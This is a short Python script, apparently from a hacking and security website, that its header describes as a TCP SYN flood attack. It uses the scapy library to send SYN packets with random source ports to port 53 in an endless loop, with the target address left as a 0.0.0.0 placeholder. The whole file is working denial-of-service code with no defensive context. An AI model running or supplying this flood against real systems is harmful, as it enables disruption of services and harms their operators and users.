#! /usr/bin/env python
# Name : Antonio Taboada
# Website : www.hackingyseguridad.com
# Description : TCP SYN Flood attack
import sys
from scapy.all import *
ip=IP(dst="0.0.0.0",frag=0,ttl=64)
SYN=TCP(sport=RandShort(),dport=53,flags="S",window=29200)
while True:
    send(ip/SYN)
